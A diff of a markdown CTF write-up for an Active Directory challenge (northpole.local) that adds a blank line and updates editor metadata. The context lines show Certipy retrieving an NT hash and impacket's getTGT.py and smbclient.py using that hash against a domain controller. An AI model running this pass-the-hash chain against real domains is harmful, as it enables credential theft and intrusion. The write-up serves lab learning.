@@ -245,6 +245,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved credential cache to 'wombleycube.ccache'
 [*] Trying to retrieve NT hash for 'wombleycube'
 [*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
+
 alabaster@ssh-server-vm:~/impacket$ ./getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -dc-ip 10.0.0.53 northpole.local/wombleycube
 
 alabaster@ssh-server-vm:~/impacket$ ./smbclient.py -k -dc-ip 10.0.0.53 -target-ip 10.0.0.53 northpole.local/wombleycube@npdc01
@@ -286,6 +287,6 @@ And he'll silently take his way.
 
 **Achievement: AD**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE2Njc0MTM0OTAsMTE2NDMzMzE3MCwxMD
-g3ODUzMTQ3LC0yMDEwMTkyNjNdfQ==
+eyJoaXN0b3J5IjpbNzgyMzcwNjg0LDExNjQzMzMxNzAsMTA4Nz
+g1MzE0NywtMjAxMDE5MjYzXX0=
 -->
